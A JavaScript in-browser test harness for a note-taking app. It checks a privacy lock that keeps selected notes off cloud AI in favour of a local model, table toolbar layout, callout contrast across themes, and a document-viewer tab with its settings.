        await aicAsk(target, 'What changes?'); await tick(); let card = app.querySelector('[data-lk-card="locked"]');
        if (!card || !/kept off cloud AI/.test(card.textContent) || !/Groq/.test(card.textContent) || !card.querySelector('[data-act="lk-local"]') || !card.querySelector('[data-act="lk-once"]')) bad('Ask says so and offers Use local AI and Unlock for this question', `${k}: ${card?.textContent.slice(0, 80)}`);
        else { low(card, k, 'the Ask notice'); const bs = [...card.querySelectorAll('.btn')].map(x => Math.round(x.getBoundingClientRect().height)); if (bs.some(h => h !== 28)) bad('the notice’s buttons are 28px', `${k}: ${bs}`); }
        LK.once = false; renderAll(); if (app.querySelector('[data-lk-card="locked"] [data-act="lk-once"]')) bad('no Unlock button when Settings turns it off', k); LK.once = true; renderAll();
        app.querySelector('[data-lk-card="locked"] [data-act="lk-local"]')?.click(); await tick(8);
        const line = app.querySelector('[data-lk-line]'); if (!line || !/Answered on this PC by Qwen3.5 4B/.test(line.textContent) || !line.textContent.includes(S0.name)) bad('the answer says it was made on this PC, and why', `${k}: ${line?.textContent}`); else low(line, k, 'the answer’s line');
        const t = aicChat(aicKey(target)).turns[0]; t.answers.splice(t.at, 1); await aicAsk(target, 'And the refresh?'); await tick(); app.querySelector('[data-lk-card="locked"] [data-act="lk-once"]')?.click(); await tick(8); });
      const asks = calls.filter(c => c[0] === 'ai_ask');
      if (asks.length < 4 || asks[0][1][5] || asks[1][1][6] !== true || asks[2][1][5] || asks[3]?.[1][5] !== true) bad('Use local AI and Unlock for this question send their flag, once', `${k}: ${asks.map(c => `${c[1][5]}/${c[1][6]}`)}`);
      // 4 · the model menu: cloud models greyed (“kept off here”), models on this PC still pickable
      reset(); LK.items = [item(sc)]; AIC.open = true; AIC.mode = 'dock'; S.tab = 'ask'; AIC.menu = { kind: 'opts' }; renderAll(); await tick();
      const cloudRows = [...app.querySelectorAll('.menu [data-act="aic-model"]')].filter(x => /^cloud:/.test(x.dataset.v)), here = [...app.querySelectorAll('.menu [data-act="aic-model"]')].filter(x => !/^cloud:/.test(x.dataset.v) && x.dataset.v !== 'auto');
      if (!cloudRows.length || cloudRows.some(x => x.getAttribute('aria-disabled') !== 'true' || !/kept off here/.test(x.textContent))) bad('the model menu greys every cloud model, saying “kept off here”', `${k}: ${cloudRows.map(x => x.getAttribute('aria-disabled') + ' ' + x.textContent.trim().slice(-14))}`);
      if (here.length && here.some(x => x.getAttribute('aria-disabled') === 'true' && /^local:/.test(x.dataset.v))) bad('models on this PC stay pickable', k);
      const mn = app.querySelector('.lk-mnote'); if (!mn || !/only models on this PC answer here/.test(mn.textContent)) bad('the model menu says why', k); else { low(mn, k, 'the model menu’s note'); inWin(mn, k, 'the model menu’s note'); }
      cloudRows[0]?.click(); await tick(); if (!/kept off cloud AI/.test(S.status || document.getElementById('status-text')?.textContent || '')) bad('picking a greyed cloud model says why', k); AIC.menu = null;
      // 5 · attachments stay on this PC
      const nn = note(), md0 = nn.md; CLOUD.att = true; nn.md = (md0 || '') + '\n![[attachments/diagram.png]]\n'; CLOUD.attPick = {}; renderAll(); await tick();
      const att = app.querySelector('[data-lk-att]'); if (!att || !/stays? on this PC too/.test(att.textContent) || !att.textContent.includes('diagram.png')) bad('a kept-off note’s attachments stay on this PC', `${k}: ${att?.textContent}`); else { low(att, k, 'the attachments line'); inWin(att, k, 'the attachments line'); }
      LK.items = []; renderAll(); if (app.querySelector('[data-lk-att]') || !app.querySelector('.cl-attline')) bad('a note that isn’t kept off keeps the normal attachments line', k);
      LK.items = [item(sc)]; CLOUD.att = false; nn.md = md0;
      // 6 · Summarise on this PC says so
      reset(); LK.items = [item(sc)]; S.toast = null; AIN.notes = {};
      await withApi({ ai_summary: () => ({ status: 'success', job: 's1' }), ai_job: () => ({ status: 'success', state: 'done', kind: 'summary', result: { answer: '- The token rotates.', by: 'Qwen3.5 4B', kept_off: S0.name } }) }, async () => { ainSummarise(target); await tick(8); });
      if (!/^Summarised on this PC by Qwen3.5 4B: .* is kept off cloud AI\.$/.test(S.toast || '') || !(S.toast || '').includes(S0.name)) bad('Summarise says it ran on this PC', `${k}: ${S.toast}`); S.toast = null;
      // 7 · the first-use question: once for a project; Esc sends nothing, Keep locks it and answers here, Send sends
      reset(); setup(sc, th, screen); AIC.open = true; AIC.mode = 'dock'; S.tab = 'ask'; renderAll(); await tick();
      const first = { status: 'success', state: 'error', message: 'This is the first time a cloud model is asked about Engineering.', code: 'cloud_first', lock: { project: 'Engineering', project_key: 'project:2', company: 'Groq' } };
      let step = 0; const fake = { ai_ask: () => ({ status: 'success', job: 'f' + (++step) }), ai_job: id => id === 'f1' ? first : done() };
      const c2 = await withApi(fake, async () => {
        await aicAsk(target, 'What changes?'); await tick(); const dlgEl = app.querySelector('[data-dlg="lock-first"]');
        if (!dlgEl || !/Engineering/.test(dlgEl.textContent) || !/Groq/.test(dlgEl.querySelector('.modal-title').textContent)) { bad('the first-use question names the project and the company', `${k}: ${dlgEl?.textContent.slice(0, 80)}`); return; }
        const fb = [...dlgEl.querySelectorAll('.modal-foot .btn')]; if (fb.length !== 2 || !fb[1].classList.contains('btn--primary') || fb[1].dataset.act !== 'lk-first-send') bad('the first-use question keeps its main button last', `${k}: ${fb.map(x => x.dataset.act)}`);
        low(dlgEl, k, 'the first-use question'); inWin(dlgEl, k, 'the first-use question');
        document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true })); await tick();
        if (app.querySelector('[data-dlg="lock-first"]') || LK.items.length || !/Nothing was sent/.test(app.querySelector('[data-lk-card], .aic-err')?.textContent || app.textContent)) bad('Esc sends nothing and keeps nothing off', k);
        step = 0; const t = aicChat(aicKey(target)).turns[0]; t.answers.splice(t.at, 1); await aicAsk(target, 'Again?', { turn: t }); await tick();
        app.querySelector('[data-act="lk-first-keep"]')?.click(); await tick(10);
        if (!LK.items.some(i => i.page === 'p-2')) bad('Keep it on this PC keeps the project off cloud AI', k);
        LK.items = []; LK.first = null; step = 0; const t2 = aicChat(aicKey(target)).turns[0]; t2.answers.splice(t2.at, 1); await aicAsk(target, 'Once more?', { turn: t2 }); await tick();
        app.querySelector('[data-act="lk-first-send"]')?.click(); await tick(10); });
      const a2 = c2.filter(c => c[0] === 'ai_ask');
      if (a2.length !== 5 || a2[2]?.[1][6] !== true || a2[4]?.[1][6] || a2[4]?.[1][5]) bad('Keep answers on this PC; Send asks again as it was', `${k}: ${a2.map(c => `${c[1][5]}/${c[1][6]}`)}`);
      AIC.open = false; AIC.chats = {};
    }
    // Timeline: what was kept off, and what was allowed again, is a row of its own type
    set({ screen: '1920x1080', theme: 'slate', view: 'history', side: true, modal: null }); out.combos++; S.type = 'AI lock'; renderAll();
    const tf = [...app.querySelectorAll('.bm-group .bm-rows > *')].map(x => x.textContent.trim().replace(/\s*\d+$/, '')); if (!tf.some(t => /^AI lock/.test(t))) bad('the Timeline filters by AI lock', tf.join(','));
    R.timeline = `${tf.length} sidebar filters`;
  } catch (e) { bad('check crashed', e.stack || e.message); }
  finally { reset(); S.type = 'All'; AI.st = keep.st; AI.demo = keep.demo; CLOUD.att = false; set({ screen: '1920x1080', theme: 'slate', view: 'notes', modal: null }); renderAll(); }
}
/* ==== end R68 ==== */

async function checkBuildP() {
  const P = out.numbers.buildP = {}, bad = (k, v) => iss('Build P ' + k, v);
  const tick = (n = 3) => new Promise(r => { let i = 0; const f = () => ++i >= n ? r() : setTimeout(f, 0); setTimeout(f, 0); });
  const clip = window.__tbNoClipboard; window.__tbNoClipboard = true;
  const row = cells => '| ' + cells.join(' | ') + ' |';
  const TYPICAL = '## Reading study results\nEight readers tried five line lengths.\n\n' + [row(['Reader', 'Line length', 'Words per minute', 'Errors', 'Notes']), '| :--- | ---: | ---: | :---: | :--- |',
    ...['Ana', 'Ben', 'Chloe', 'Dev', 'Ema', 'Farid', 'Grace', 'Hugo'].map((r, i) => row([r, [55, 70, 70, 85, 100, 55, 70, 85][i], [212, 248, 236, 229, 201, 219, 251, 222][i], [2, 1, 0, 3, 5, 1, 0, 2][i], ['Comfortable, a little slow', 'Fastest', 'Liked the margins', 'Lost his place twice', 'Too wide on the laptop', '', 'Asked for this width again', 'Fine with the ruler on'][i]]))].join('\n') + '\n\n## What we’ll change\n- Default the reading column to about 70 characters.';
  const WIDE = '## Every setting\n\n' + [row(Array.from({ length: 11 }, (_, c) => 'Setting ' + (c + 1))), row(Array(11).fill('---')), ...Array.from({ length: 6 }, (_, r) => row(Array.from({ length: 11 }, (_, c) => `Reader ${r + 1}, value ${c + 1}`)))].join('\n');
  const RICH = '## Reading budget\nWhat each study costs this quarter.\n<table data-nv-borders="all">\n  <colgroup><col style="width:120px"><col style="width:200px"><col style="width:96px"><col style="width:96px"><col style="width:240px"></colgroup>\n  <tr>\n    <th data-nv-bg="blue" style="background:#cfe0f7">Team</th>\n    <th data-nv-bg="blue" style="background:#cfe0f7">Study</th>\n    <th data-nv-bg="blue" style="text-align:right;background:#cfe0f7">Planned</th>\n    <th data-nv-bg="blue" style="text-align:right;background:#cfe0f7">Spent</th>\n    <th data-nv-bg="blue" style="background:#cfe0f7">Status</th>\n  </tr>\n  <tr>\n    <td rowspan="2" style="vertical-align:middle">**Reading**</td>\n    <td>[[Line length study]]</td>\n    <td style="text-align:right">£4,000</td>\n    <td style="text-align:right">£3,200</td>\n    <td><ul><li>Fieldwork done</li><li>Write-up by **24 Oct**</li></ul></td>\n  </tr>\n  <tr>\n    <td>Ruler prototype</td>\n    <td style="text-align:right">£2,500</td>\n    <td data-nv-fg="red" style="text-align:right;color:#b42318">£2,900</td>\n    <td><label class="r48-chk"><input type="checkbox"> Needs sign-off from Maya</label></td>\n  </tr>\n  <tr>\n    <td colspan="2">**Total**</td>\n    <td style="text-align:right">£9,500</td>\n    <td style="text-align:right">£7,200</td>\n    <td data-nv-bg="green" style="background:#cdebc5">Under budget</td>\n  </tr>\n</table>\n\n## Next\n- Ask Maya to sign off the ruler overspend.';
  const box = el => { const b = el.getBoundingClientRect(); return b; }, meet = (a, b) => a.left < b.right && a.right > b.left && a.top < b.bottom && a.bottom > b.top;
  const acts = sel => [...app.querySelectorAll(sel)].map(b => b.dataset.tb).filter(Boolean);
  for (const sc of ['1366x768', '3440x1440']) for (const [kind, md] of [['typical', TYPICAL], ['wide', WIDE], ['rich', RICH]]) {
    set({ screen: sc, theme: 'obsidian', sample: 'typical', view: 'notes', modal: null, side: true, zen: 'off' });
    const n = D.notes[0], key = `${sc} ${kind}`; S.noteId = n.id; n.md = md; n.html = null; TB.cur = null; TB.sel = null; TB.menu = null; TB.more = false; TB.pick = null; renderAll(); await tick();
    const doc = app.querySelector('.doc'), tb = doc?.querySelector('table'); if (!tb) { bad('a table drawn in the note', key); continue; }
    const p = { id: n.id, t: 0, r: 1, c: 1 }; tbCaret(p); tbPaint(); await tick();
    measure('Build P ' + key); inside('.tb-bar', key);
    const bar = app.querySelector('.tb-bar'), ab = box(app), barW = bar ? Math.round(box(bar).width) : 0;
    if (!bar) bad('the toolbar with the caret in a cell', key);
    else { const b = box(bar); if (b.left < ab.left - 1 || b.right > ab.right + 1 || b.top < ab.top - 1) bad('the toolbar inside the window', key);
      const hit = [...app.querySelectorAll('.tb-grip, .tb-plus')].filter(g => meet(box(g), b)); if (hit.length) bad('no grip under the toolbar', `${key}: ${hit.length}`); }
    if (!app.querySelectorAll('.tb-layer .tb-grip').length) bad('grips beside the table with the caret in it', key);
    if (kind === 'wide') { const v = app.querySelector('.view--note');
      if (sc === '1366x768' && tb.scrollWidth <= tb.clientWidth + 1) bad('a wide table scrolls inside itself', `${key}: ${tb.scrollWidth} ≤ ${tb.clientWidth}`);
      if (box(tb).right > box(doc).right + 1) bad('a wide table stays inside the note column', key);
      if (v && v.scrollWidth > v.clientWidth + 1) bad('the page never scrolls sideways', key); }
    if (kind === 'rich') { if (!app.querySelector('.tb-richtag')) bad('the rich tag under a rich table', key);
      const back = NVMarkdown.htmlToMd(doc); if (back !== md) bad('the rich table saves as it was read', key);
      const team = tbCellAt({ id: n.id, t: 0, r: 0, c: 0 }), w = Math.round(team.getBoundingClientRect().width / (box(app).width / app.offsetWidth || 1)); if (Math.abs(w - 120) > 1) bad('a set column width holds', `${key}: ${w}px, not 120px`); }
    const all = new Set(acts('.tb-bar [data-tb]'));
    for (const k of ['colour', 'borders']) { TB.pick = k; tbPaint(); acts('.tb-pick [data-tb]').forEach(x => all.add(x)); inside('.tb-pick', key); }
    TB.pick = null; TB.more = true; tbPaint(); acts('.tb-moremenu [data-tb]').forEach(x => all.add(x)); inside('.tb-moremenu', key); TB.more = false;
    const c = tbCellAt(p), cb = box(c); TB.menu = { kind: 'cell', x: cb.left + 20, y: cb.top + 12 }; tbPaint(); await tick();
    const menu = acts('.tb-menu--cell [data-tb]').sort().join(' '); inside('.tb-menu', key);
    const mb = app.querySelector('.tb-menu') && box(app.querySelector('.tb-menu')); if (mb && (mb.bottom > ab.bottom + 1 || mb.top < ab.top - 1)) bad('the right-click menu inside the window', key);
    if (app.querySelector('.tb-bar')) bad('the toolbar steps aside for the right-click menu', key);
    TB.menu = null; tbPaint();
    const s0 = [...all].sort().join(' ');
    P[key] = `${all.size} actions · menu ${menu.split(' ').length} · toolbar ${barW}px · table ${tb.scrollWidth > tb.clientWidth + 1 ? 'scrolls inside itself' : 'fits'}`;
    if (s0 !== menu || all.size !== 41) bad('the same 41 actions in the toolbar and the right-click menu', `${key}: ${all.size} vs ${menu.split(' ').length}`);
    TB.cur = null; TB.sel = null; n.html = null;
  }
  window.__tbNoClipboard = clip;
  // QC 40 · callouts: every type's title (and icon) against its tinted box, in every theme, at 4.5:1; no [!type] marker as text
  { const types = ['note', 'summary', 'info', 'todo', 'tip', 'success', 'question', 'warning', 'failure', 'danger', 'bug', 'example', 'quote', 'unknown'], low = [];
    const rgb = c => { const v = (c.match(/[\d.]+/g) || []).map(Number); return /^color\(srgb/.test(c) ? v.map((x, i) => i < 3 ? x * 255 : x) : v; },   /* color-mix() comes back as color(srgb 0–1) */ solid = el => { for (let e = el; e; e = e.parentElement) { const c = getComputedStyle(e).backgroundColor, v = rgb(c); if (v.length >= 3 && (v.length < 4 || v[3] > 0.5)) return v; } return [255, 255, 255]; };
    let worst = 99;
    for (const [th] of THEMES) {
      set({ screen: '1920x1080', theme: th, sample: 'typical', view: 'notes', modal: null }); const n = D.notes[0]; n.md = types.map(t => `> [!${t}] ${t} title\n> body`).join('\n\n'); n.html = null; renderAll();
      const doc = app.querySelector('.doc'); if (/\[!/.test(doc.textContent)) bad('callouts show no [!type] text', th);
      doc.querySelectorAll('blockquote.callout').forEach(q => { const t = q.querySelector(':scope > .callout-title'), base = solid(q.parentElement), line = rgb(getComputedStyle(q).borderLeftColor);
        const mix = base.slice(0, 3).map((b, i) => Math.round(b * 0.93 + line[i] * 0.07)), r = ratio(`rgb(${rgb(getComputedStyle(t).color).slice(0, 3).map(Math.round).join(',')})`, `rgb(${mix.join(',')})`); worst = Math.min(worst, r);
        if (r < 4.5) low.push(`${th} ${q.dataset.callout} ${r}`); });
      n.html = null; }
    P.callouts = `${types.length} types × ${THEMES.length} themes · lowest title contrast ${worst}`;
    if (low.length) bad('callout titles readable in every theme (4.5:1)', low.slice(0, 6).join(', ')); }
  set({ screen: '1920x1080', view: 'notes', sample: 'typical', modal: null });
}
/* ==== end Build P ==== */
function show() {
  window.__check = out; console.log('NeuroVault check', out);
  const pre = document.createElement('pre'); pre.id = 'check-out'; pre.dataset.done = '1';
  pre.style.cssText = 'position:fixed;right:8px;bottom:8px;z-index:1000;max-width:520px;max-height:40vh;overflow:auto;margin:0;padding:8px 10px;font:11px/1.4 ui-monospace,monospace;background:#000;color:#fff;border:1px solid #666;border-radius:6px;white-space:pre-wrap';
  pre.textContent = out.summary + '\n' + (Object.entries(out.issues).map(([k, v]) => `• ${k} (${v.length}): ${v.slice(0, 3).join(' | ')}`).join('\n') || 'No issues.') + '\nFull result: window.__check';
  pre.addEventListener('click', () => pre.remove()); document.body.appendChild(pre);
  const dump = new URLSearchParams(location.search).get('dump');   // headless runs (--dump-dom) read one block's numbers: ?dump=buildN.qc98
  if (dump) { const d = document.createElement('pre'); d.id = 'check-dump'; d.hidden = true; try { d.textContent = JSON.stringify(dump.split('.').reduce((o, k) => o?.[k], out.numbers)); } catch (e) { d.textContent = String(e); } document.body.appendChild(d); }
}
window.__check = null;
/* ==== Build V · the vault on disk (profile, 2026-10-18: "First run starts with your vault folder"): the setup's step 1 and
   the one-time screen on four screens (the mockup's text and two cards, no Obsidian daily notes, nothing cut or
   sideways, controls on the scale), Create vault / Next / the name, the one-time screen holding Esc, shortcuts and other
   dialogs, Settings → Vault & files, and notes changed outside NeuroVault reaching the page (your typing wins). On the
   sample: nothing is written. Runs in the full sweep, or alone with ?check=1&only=buildv ==== */
/* ==== Build DV (mockup R66): the document viewer, from NeuroVault's window. Open and a double-click on a PDF's card, Open in the
   Attachments tab and Ctrl+K reach the viewer (viewer_open, with this window's look); the card's "Annotated · N" chip and the
   Attachments tab's line; no banner and no copy in the note (QC 100); the Timeline's rows with Restore. The viewer window itself
   has its own check: viewer.html?check=1&mute=1. Runs in the full sweep, or alone with ?check=1&only=dv ==== */
async function checkDocViewer() {
  const R = out.numbers.docViewer = {}, bad = (k, v) => iss('Build DV ' + k, v), F = 'attachments/audit-quote.pdf', tick = () => new Promise(r => setTimeout(r, 0));
  set({ screen: '1366x768', sample: 'typical', view: 'notes', modal: null, inspector: 'shown' });
  const n0 = D.notes.find(n => (n.md || '').includes(`![[${F}]]`)); if (!n0) { bad('the sample', 'no note with the PDF'); return; }
  openNote(n0.id); renderAll(); const card = () => app.querySelector(`.att-embed[data-embed-for="${F}"]`);
  // Open and a double-click open it in a tab, like a note (QC 114); Pop out gives it its own window
  const inTab = () => UI.view === 'doc' && S.tabs.find(t => t.id === S.activeTab)?.kind === 'doc' && S.tabs.find(t => t.id === S.activeTab)?.ref === F && /Viewing audit-quote\.pdf as it is, in a tab/.test(S.status);
  const back = () => { const t = S.tabs.find(x => x.kind === 'doc' && x.ref === F); if (t) S.tabs.splice(S.tabs.indexOf(t), 1); UI.view = 'notes'; openNote(n0.id); renderAll(); };
  S.status = ''; card()?.querySelector('[data-act="att-show"]')?.click(); R.open = S.status; if (!inTab()) bad('Open on the card', S.status); back();
  S.status = ''; card()?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true })); if (!inTab()) bad('a double-click on the card', S.status); back();
  // the chip, the Attachments tab, Ctrl+K: with notes on the file
  const a = attByFile(F), keepN = a.annotated; a.annotated = 5; renderAll();
  R.chip = card()?.querySelector('.dv-badge')?.textContent; if (R.chip !== 'Annotated · 5' || !card()?.querySelector('.dv-badge + [data-act="att-show"]')) bad('the chip on the card', R.chip);
  if (/Edited copy|annotated\)\.pdf/.test(app.querySelector('.doc')?.textContent || '')) bad('a banner or a copy in the note (QC 100)', '');
  measure('dv/chip');
  S.tab = 'files'; S.attOpen = F; renderAll(); const row = app.querySelector(`[data-act="att-open"][data-v="${F}"]`);
  R.row = row?.querySelector('.list-item-sub')?.textContent; if (!/^Annotated · 5 notes · /.test(R.row || '')) bad('the Attachments tab', R.row);
  S.status = ''; app.querySelector(`.att-detail [data-act="att-show"][data-v="${F}"]`)?.click(); if (!inTab()) bad('Open in the Attachments tab', S.status); back();
  S.tab = 'outline'; S.attOpen = null;
  S.pal = { q: 'audit', ix: 0 }; set({ modal: 'palette' }); const grp = [...app.querySelectorAll('.pal-group')].map(x => x.textContent), it = [...app.querySelectorAll('.pal-item')].find(x => /Open in the viewer · Annotated · 5/.test(x.textContent));
  R.palette = grp.join(' | '); if (!grp.includes('Documents') || !it) bad('Ctrl+K', R.palette);
  S.status = ''; it?.click(); await tick(); if (!inTab()) bad('Ctrl+K opens it', S.status); back();
  set({ modal: null }); a.annotated = keepN;
  // a real vault (a stand-in bridge): viewer_open gets the file, the note and this window's look; the Timeline's rows and Restore
  const was = window.pywebview, live0 = VAULT.live, calls = [], now = new Date().toISOString();
  const log = [{ id: 7, file: F, name: 'audit-quote.pdf', note_id: rawId(n0.id), title: n0.title, what: 'notes', counts: { pin: 2 }, said: '2 pins', before_said: 'no notes', copy: null, at: now, restored_at: null, can_restore: true },
    { id: 8, file: F, name: 'audit-quote.pdf', note_id: null, title: null, what: 'copy', counts: {}, said: 'no notes', copy: '["audit-quote (annotated).pdf"]', at: now, restored_at: null, can_restore: false }];
  const fake = { viewer_open: () => ({ status: 'success', file: F }), viewer_tab_open: () => ({ status: 'error', message: 'stand-in' }), list_doc_annotations: () => log,
    restore_doc_annotations: () => { log[0].restored_at = new Date().toISOString(); log[0].can_restore = false; return { status: 'success', file: F, count: 0 }; },
    list_attachments: () => ({ status: 'success', files: D.atts, folder: '' }) };
  window.pywebview = { api: new Proxy({}, { get: (_, nm) => typeof nm !== 'string' || nm === 'then' ? undefined : (...x) => { calls.push([nm, x]); return Promise.resolve(fake[nm] ? fake[nm](...x) : []); } }) };
  try {
    VAULT.live = true; await dvOpen(F, n0.id); for (let i = 0; i < 20 && !calls.some(x => x[0] === 'viewer_tab_open'); i++) await tick(); const c = calls.find(x => x[0] === 'viewer_tab_open');
    if (!c || c[1][0] !== F || c[1][1] !== rawId(n0.id) || c[1][2]?.theme !== document.body.dataset.theme || !/^#[0-9a-f]{6}$/.test(c[1][2]?.bg || '')) bad('viewer_tab_open gets the file, the note and the look', String(JSON.stringify(c?.[1])).slice(0, 120));
    for (let i = 0; i < 30 && !/couldn’t be shown/.test(app.querySelector('.dv-dempty')?.textContent || ''); i++) await tick();
    if (!/couldn’t be shown/.test(app.querySelector('.dv-dempty')?.textContent || '')) bad('a document that can’t open says so in its tab', ''); Object.keys(DVT.frames).forEach(dvDrop); back();
    D.events = []; S.bm.actAt = 0; S.bm.actBusy = false; await bmActivity(); const ev = D.events.filter(e => String(e.id).startsWith('dv-'));
    R.timeline = ev.map(e => e.title).join(' | ');
    if (ev.length !== 2 || ev.find(e => e.id === 'dv-7')?.restoreAct !== 'dv-restore' || ev.find(e => e.id === 'dv-7')?.restoreId !== 7 || ev.find(e => e.id === 'dv-8')?.restoreId != null) bad('the Timeline rows', R.timeline);
    UI.view = 'history'; S.range = 'All'; S.type = 'All'; renderAll(); const btn = app.querySelector('[data-act="dv-restore"][data-v="7"]'); if (!btn) bad('Restore on the Timeline', '');
    btn?.click(); for (let i = 0; i < 20 && !calls.some(x => x[0] === 'restore_doc_annotations'); i++) await tick(); await new Promise(r => setTimeout(r, 30));
    if (!calls.some(x => x[0] === 'restore_doc_annotations' && x[1][0] === 7) || !/The notes from before are back on audit-quote\.pdf/.test(S.status)) bad('Restore', S.status);
    measure('dv/timeline');
  } finally { window.pywebview = was; VAULT.live = live0; D.events = []; UI.view = 'notes'; }
  // Settings → Document viewer (R66 "customisable user setting"): the six places, the floating bar by default; a pick is saved
  // (config.json viewer_tools) and a viewer's own change reaches this page; Reset to defaults puts the floating bar back
  { const keepT = DV.tools, keepSave = saveSettings, saves = []; saveSettings = p => saves.push(p);
    try { DV.tools = DV_TOOLS_DEFAULT; S.setSec = 'viewer'; set({ screen: '1366x768', modal: 'settings' }); const opts = () => [...app.querySelectorAll('[data-act="dv-tools"]')];
      R.settings = `${SET_SECTIONS.find(s => s[0] === 'viewer')?.[1]} · ${opts().map(b => b.textContent).join(' | ')}`;
      if (opts().map(b => b.dataset.v).join() !== 'top,float,rail,bottom,context,panel' || app.querySelector('[data-act="dv-tools"][aria-pressed="true"]')?.dataset.v !== 'top' || DV_TOOLS_DEFAULT !== 'top') bad('Settings: the six places, the bar under the window bar by default', R.settings);
      if (!app.querySelector('[data-act="dv-tools-reset"]')?.disabled) bad('Settings: Reset to defaults greyed with nothing changed', '');
      measure('dv/settings 1366');
      opts().find(b => b.dataset.v === 'panel').click(); if (DV.tools !== 'panel' || !saves.some(p => p.viewer_tools === 'panel') || app.querySelector('[data-act="dv-tools"][aria-pressed="true"]')?.dataset.v !== 'panel' || !/In the notes panel|top of your notes/.test(app.querySelector('[data-dv-tools-say]')?.textContent || '')) bad('Settings: a pick is saved and shown', JSON.stringify(saves));
      window.nvSync({ kind: 'docv-tools', bar: 'rail' }); if (DV.tools !== 'rail' || app.querySelector('[data-act="dv-tools"][aria-pressed="true"]')?.dataset.v !== 'rail') bad('Settings: a change in a viewer reaches this page', DV.tools);
      readerFromConfig({ viewer_tools: 'bottom' }); if (DV.tools !== 'bottom') bad('Settings: read back from config.json', DV.tools); readerFromConfig({ viewer_tools: 'nowhere' }); if (DV.tools !== 'bottom') bad('Settings: an unknown place is ignored', DV.tools);
      renderAll(); app.querySelector('[data-act="dv-tools-reset"]')?.click(); if (DV.tools !== 'top' || saves[saves.length - 1]?.viewer_tools !== 'top') bad('Settings: Reset to defaults', DV.tools);
      set({ screen: '3440x1440', modal: 'settings' }); measure('dv/settings 3440');
    } finally { saveSettings = keepSave; DV.tools = keepT; S.modal = null; S.setSec = 'appearance'; } }
  // ---- QC 114 / R70: documents in tabs, like notes. The Documents tab (Alt+6) in the right sidebar: View first, Convert never the
  // main click; a document's tab: a file icon, a small PDF / Word label, Pop out on it and in the header; viewing isn't converting
  { const D0 = { tabs: S.tabs.map(t => ({ ...t })), active: S.activeTab, view: UI.view, tab: S.tab }; DVT.menu = null; DVT.q = '';
    set({ screen: '1366x768', sample: 'typical', view: 'notes', modal: null, inspector: 'shown' }); openNote(n0.id); renderAll();
    document.dispatchEvent(new KeyboardEvent('keydown', { key: '6', code: 'Digit6', altKey: true, bubbles: true, cancelable: true }));
    const st = app.querySelector('#insp-tab-docs'); R.docsTab = st?.dataset.tip;
    if (!st || st.getAttribute('aria-selected') !== 'true' || st.dataset.tip !== 'Documents · Alt+6' || st.getAttribute('aria-keyshortcuts') !== 'Alt+6' || st.textContent.trim()) bad('QC 114: the Documents tab (an icon, Alt+6)', R.docsTab);
    const panel = app.querySelector('[data-dv-panel]'), mains = [...app.querySelectorAll('[data-dv-panel] .dv-rmain')];
    if (!panel || !mains.length || mains.some(b => !/^View /.test(b.getAttribute('aria-label') || '')) || [...app.querySelectorAll('[data-dv-panel] .dv-rmain, [data-dv-panel] > .btn')].some(b => /Convert/.test(b.textContent))) bad('QC 114: View is the main click, never Convert', mains.map(b => b.getAttribute('aria-label')).join());
    if (!/View it as it is/.test(panel?.textContent || '') || !app.querySelector('[data-dv-panel] [data-act="dv-pick"]')) bad('QC 114: Open a file… and the line that says viewing isn’t converting', '');
    measure('dv/docs panel 1366');
    app.querySelector('[data-dv-panel] [data-act="dv-more"]')?.click(); const mi = [...app.querySelectorAll('.dv-dmenu .menu-item')].map(b => b.textContent.trim());
    if (!/^View/.test(mi[0] || '') || !app.querySelector('.dv-dmenu .menu-sep + .dv-conv') || !/Makes a Markdown copy/.test(mi[mi.length - 1] || '')) bad('QC 114: ⋮ puts View first and Convert set apart', mi.join(' | '));
    DVT.menu = null; renderAll();
    const empty = D.notes.find(n => !noteEmbeds(n).some(f => dvKind(f))); if (empty) { openNote(empty.id); inspTabGo('docs'); if (!/View it as it is/.test(app.querySelector('.dv-pempty')?.textContent || '') || !/Make a note from it/.test(app.querySelector('.dv-pempty')?.textContent || '')) bad('QC 114: the empty state’s two lines', ''); openNote(n0.id); inspTabGo('docs'); }
    DVT.q = 'quote'; renderAll(); if (![...app.querySelectorAll('[data-dv-panel] .dv-rmain')].some(b => /audit-quote/.test(b.getAttribute('aria-label')))) bad('QC 114: Find a document', ''); DVT.q = ''; renderAll();
    // View: a tab like a note's, with its own look; the viewer fills the area (the desktop app draws it there)
    app.querySelector(`[data-dv-panel] [data-act="dv-view"][data-v="${F}"]`)?.click();
    const dt = app.querySelector('.ws-tab.dv-wstab'), sel = [...app.querySelectorAll('.tabstrip .ws-tab[aria-selected="true"]')];
    R.docTab = dt ? `${dt.querySelector('.ws-tab-title')?.textContent} · ${dt.querySelector('.dv-ttype')?.textContent} · pop ${!!dt.querySelector('.dv-tpop')}` : 'none';
    if (!dt || sel.length !== 1 || sel[0] !== dt || dt.querySelector('.dv-ttype')?.textContent !== 'PDF' || !dt.querySelector('.ws-tab-icon svg') || !dt.querySelector('.dv-tpop[aria-label^="Pop out"]') || dt.getAttribute('draggable') !== 'true') bad('QC 114: the document’s tab (a file icon, PDF, Pop out; it drags, into a pane)', R.docTab);
    if (UI.view !== 'doc' || !app.querySelector('.dv-dhead [data-act="dv-pop"]') || !/Document · audit-quote\.pdf/.test(app.querySelector('.crumb-text')?.textContent || '') || !app.querySelector('[data-dv-host]')) bad('QC 114: the document in the main area, with Pop out in its header', UI.view);
    if (/words/.test(app.querySelector('.status-bar, .statusbar, footer')?.textContent || '')) bad('QC 114: no word count for a document', '');
    measure('dv/doc tab 1366'); set({ screen: '3440x1440' }); measure('dv/doc tab 3440'); set({ screen: '1366x768' });
    app.querySelector('.dv-dhead [data-act="dv-more"]')?.click(); const hm = [...app.querySelectorAll('.dv-dmenu.is-head .menu-item')].map(b => b.textContent.trim());
    if (!/^Pop out/.test(hm[0] || '') || !app.querySelector('.dv-dmenu.is-head .menu-sep + .dv-conv')) bad('QC 114: the header’s ⋮', hm.join(' | '));
    S.status = ''; app.querySelector('.dv-dmenu.is-head [data-act="dv-convert"]')?.click(); if (!/Convert to a note…: makes a Markdown note/.test(S.status) || UI.view !== 'doc') bad('QC 114: Convert is its own action (the document stays open)', S.status);
    // a note opened from here gets its own tab; the document's tab stays
    openNote(n0.id); if (UI.view !== 'notes' || !dvTabOf(F) || S.tabs.find(t => t.id === S.activeTab)?.kind !== 'note') bad('QC 114: a note opens beside the document’s tab', UI.view);
    activateTab(dvTabOf(F).id); if (UI.view !== 'doc') bad('QC 114: back to the document’s tab', UI.view);
